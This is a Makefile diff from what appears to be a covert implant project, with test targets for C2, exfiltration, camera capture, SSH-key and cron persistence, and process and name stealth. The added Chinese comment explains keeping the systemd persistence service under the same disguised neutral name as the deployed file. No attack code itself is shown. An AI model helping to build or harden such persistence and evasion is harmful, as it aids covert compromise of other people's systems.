@@ -276,6 +276,14 @@ verify-onekey-front:
 verify-sshkey-persist:
 	@python3 tests/verify_sshkey_persist.py
 
+# 驻留服务名一致性守卫：部署侧已把落点伪装成中性名，而驻留段此前硬编码
+# 项目名——两个名字不一致在真机上是三重合失效（伪装失效 / 双重驻留 /
+# 卸载残留），而部署报告仍是全绿。同时守住"名字可配"带来的新增攻击面：
+# 服务名被拼进 ".../etc/systemd/system/<name>.service"，接受任意字符串
+# 即为任意路径可写，字符集校验必须逐条验证被拒绝。
+verify-svcname:
+	@python3 tests/verify_svcname_consistency.py
+
 verify-prefix:
 	@python3 tests/verify_prefix_isolation.py
 
@@ -307,7 +315,7 @@ verify-unit-contract-reverse:
 	@python3 tests/verify_unit_contract.py restart
 	@python3 tests/verify_unit_contract.py paths
 
-test: verify-upload verify-c2 verify-c2-reverse verify-tls-sink verify-onekey-sink verify-onekey-arch verify-onekey-front verify-sshkey-persist verify-cron-exec verify-prefix verify-name-stealth verify-cmdline-stealth verify-unit-contract verify-unit-contract-reverse verify-daemon-resilience $(BUILD)/test_exfil $(BUILD)/test_cam_e2e $(BUILD)/test_exfil_circuit $(BUILD)/test_sched $(BUILD)/test_sched_gate $(BUILD)/test_task $(BUILD)/test_task_circuit $(BUILD)/test_link_cover $(BUILD)/test_task_cover $(BUILD)/test_cover_loop $(BUILD)/test_cover_circuit $(BUILD)/test_exfil_cover_circuit $(BUILD)/test_tol
+test: verify-upload verify-c2 verify-c2-reverse verify-tls-sink verify-onekey-sink verify-onekey-arch verify-onekey-front verify-sshkey-persist verify-svcname verify-cron-exec verify-prefix verify-name-stealth verify-cmdline-stealth verify-unit-contract verify-unit-contract-reverse verify-daemon-resilience $(BUILD)/test_exfil $(BUILD)/test_cam_e2e $(BUILD)/test_exfil_circuit $(BUILD)/test_sched $(BUILD)/test_sched_gate $(BUILD)/test_task $(BUILD)/test_task_circuit $(BUILD)/test_link_cover $(BUILD)/test_task_cover $(BUILD)/test_cover_loop $(BUILD)/test_cover_circuit $(BUILD)/test_exfil_cover_circuit $(BUILD)/test_tol
 	./$(BUILD)/test_exfil
 	./$(BUILD)/test_cam_e2e
 	./$(BUILD)/test_exfil_circuit
@@ -331,5 +339,5 @@ inspect: all
 clean:
 	rm -rf $(BUILD)
 
-.PHONY: all test clean inspect verify-upload verify-c2 verify-c2-reverse verify-tls-sink verify-onekey-sink verify-onekey-arch verify-onekey-front verify-sshkey-persist verify-cron-exec verify-prefix verify-name-stealth verify-cmdline-stealth verify-unit-contract verify-unit-contract-reverse verify-daemon-resilience
+.PHONY: all test clean inspect verify-upload verify-c2 verify-c2-reverse verify-tls-sink verify-onekey-sink verify-onekey-arch verify-onekey-front verify-sshkey-persist verify-svcname verify-cron-exec verify-prefix verify-name-stealth verify-cmdline-stealth verify-unit-contract verify-unit-contract-reverse verify-daemon-resilience
 
